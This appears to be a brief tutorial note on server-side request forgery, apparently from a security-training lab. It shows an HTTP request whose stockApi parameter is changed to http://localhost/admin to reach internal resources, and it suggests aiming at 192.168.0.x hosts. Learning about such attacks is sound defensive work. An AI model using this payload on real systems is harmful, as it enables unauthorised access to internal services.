I can obtain information from the interaction between the application and internal systems.
Example:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
The application attempts to connect to an exposed external API.
By modifying this parameter, it is possible to force the server to connect to internal resources with localhost or 127.0.0.1
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```
There are some cases that the vuln is not in localhost therefore it is in the same network like 192.168.0.xIn some cases, the vulnerable service is not hosted on localhost, but within the same internal network, for example 192.168.0.x.
